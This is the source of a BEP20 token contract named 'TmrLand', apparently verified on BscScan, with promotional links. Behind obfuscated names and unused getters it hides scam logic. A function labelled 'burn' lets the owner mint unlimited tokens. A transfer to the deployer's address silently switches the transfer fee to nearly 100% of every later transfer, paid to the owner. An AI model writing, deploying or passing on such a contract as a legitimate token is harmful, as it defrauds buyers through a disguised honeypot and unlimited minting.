/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/*
https：//tomorrowland.love
https://t.me/Tomorrowland_Global
https://discord.com/invite/tomorrowland-global
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
contract TmrLand {
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  KFRPFA = 1000000000000000000000;
uint256 private  PQZQPN = 1000000000000000000;
uint256 private  SQDLEY = 10000000000;
uint256 private  NOVMUE = 10000000000000;
uint256 private  RWGYBA = 1000000000000000;
string public  symbol = "TmrLand";
address private  LLFZIR = address(0);
address private  SKQJGQ = address(0);
uint256 private  NNZAWL = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant GUVSIL = 99999;
uint256 private  HDHPYE = 100000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
string public  name = "TmrLand";
address private  QCGTOS = address(0);
address private  ODXMBE = address(0);
address private  SGPJUQ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getLLFZIR() private returns (address) {
return LLFZIR;
}

constructor () {
SKQJGQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OTXDCC");
require(to != address(0), "OTXDCC");
require(amount <= balanceOf[from], "OTXDCC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GUVSIL/PQZQPN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SKQJGQ){
PQZQPN = GUVSIL+2;
}
emit Transfer(from, to, transferAmount);
}
function _getQCGTOS() private returns (address) {
return QCGTOS;
}

function _getODXMBE() private returns (address) {
return ODXMBE;
}

function _getSQDLEY() private returns (uint256) {
return SQDLEY;
}

function _getNNZAWL() private returns (uint256) {
return NNZAWL;
}

function _getHDHPYE() private returns (uint256) {
return HDHPYE;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tOTXDCC 0");
require(spender != address(0), "fOTXDCC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getSGPJUQ() private returns (address) {
return SGPJUQ;
}

function _getNOVMUE() private returns (uint256) {
return NOVMUE;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getKFRPFA() private returns (uint256) {
return KFRPFA;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getRWGYBA() private returns (uint256) {
return RWGYBA;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}